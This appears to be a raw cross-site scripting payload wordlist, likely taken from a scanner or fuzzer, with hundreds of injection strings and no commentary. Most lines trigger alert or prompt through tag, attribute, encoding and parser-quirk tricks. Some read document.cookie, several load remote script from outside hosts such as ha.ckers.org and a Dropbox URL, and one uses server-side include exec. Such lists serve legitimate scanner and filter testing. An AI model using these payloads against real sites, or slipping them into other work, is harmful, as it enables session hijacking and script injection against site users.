"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
"><img src=x onerror=javascript:alert(1)>
"><img src=x onerror=javascript:alert('1')>
"><img src=x onerror=javascript:alert("1")>
"><img src=x onerror=javascript:alert(`1`)>
"><img src=x onerror=javascript:alert(('1'))>
"><img src=x onerror=javascript:alert(("1"))>
"><img src=x onerror=javascript:alert((`1`))>
"><img src=x onerror=javascript:alert(A)>
"><img src=x onerror=javascript:alert((A))>
"><img src=x onerror=javascript:alert(('A'))>
"><img src=x onerror=javascript:alert('A')>
"><img src=x onerror=javascript:alert(("A"))>
"><img src=x onerror=javascript:alert("A")>
"><img src=x onerror=javascript:alert((`A`))>
"><img src=x onerror=javascript:alert(`A`)>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
<iframe  src="&Tab;javascript:prompt(1)&Tab;">
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<img/src=`` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=``&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /**/>/**/alert(1)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe// src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
